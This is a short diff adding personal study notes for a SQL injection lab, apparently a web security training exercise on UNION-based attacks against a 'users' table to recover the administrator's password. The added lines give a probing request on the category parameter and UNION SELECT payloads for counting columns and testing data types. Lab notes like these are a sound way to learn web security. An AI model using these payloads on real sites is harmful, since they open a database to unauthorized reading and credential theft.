@@ -160,3 +160,14 @@ SQL9: injection UNION attack, retrieving data from other tables
 
 GIVEN : The database contains a different table called users.
         columns called username and password. FIND THE PASSWORD OF administrator. 
+
+      -FIND THE VULNERABLE PARAMETERS
+      GET /filter?category=Lifestyle'--+ HTTP/2
+
+
+
+      -fIND THE NO. OF COLUMNS 
+      'UNION SELECT NULL,NULL,NULL --+
+
+      -FIND THE DATA TYPE OF COLUMNS
+      'UNION SELECT NULL,'LJXwKG',NULL --+
